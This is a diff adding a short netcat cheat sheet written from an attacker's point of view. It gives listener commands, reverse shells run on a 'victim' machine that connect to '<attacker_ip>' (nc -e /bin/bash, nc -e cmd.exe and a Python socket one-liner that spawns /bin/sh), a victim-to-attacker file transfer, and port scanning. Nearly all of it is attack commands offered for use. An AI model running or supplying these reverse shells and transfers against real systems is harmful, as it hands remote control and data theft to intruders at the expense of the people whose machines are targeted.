@@ -1,0 +1,45 @@
+1. Starting a Listener (to receive connections): nc -lvp 4444
+
+2. Connecting to a Listener (on the victim machine): nc <attacker_ip> 4444
+
+3. Reverse Shell (Victim to Attacker):
+On the attacker's machine (listening): nc -lvp 4444
+On the victim machine: nc <attacker_ip> 4444 -e /bin/bash
+
+4. File Transfer (Sending Files to the Victim):
+On the attacker’s machine (to listen for the incoming file): nc -lvp 4444 > received_file.txt
+On the victim machine (to send a file): nc <attacker_ip> 4444 < file_to_send.txt
+
+5. Creating a Banner Grabber (Scan for open ports): nc -zv <target_ip> 1-1024
+
+6. Creating a Chat Server:
+On the attacker’s machine (listening):nc -lvp 4444
+On the victim’s machine (connecting to the attacker): nc <attacker_ip> 4444
+
+
+
+* Listening for Incoming Connections
+On the attacker's machine: nc -lvp <port>
+
+* Establishing a Reverse Shell
+On the target machine (Linux): nc <attacker_ip> <port> -e /bin/bash
+On the target machine (Windows): nc <attacker_ip> <port> -e cmd.exe
+
+* Using Python for Reverse Shell
+On the target machine: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+* File Transfer 
+To send a file: nc <destination_ip> <port> < file_to_send
+To receive a file: nc -lvp <port> > received_file
+
+* Port Scanning To check for open ports: nc -zv <host> <start_port>-<end_port>
+
+* Chatting Between Two Systems:
+On one machine (sender): nc <destination_ip> <port>
+On the other machine (receiver): nc -lvp <port>
+
+
+
+
+
+
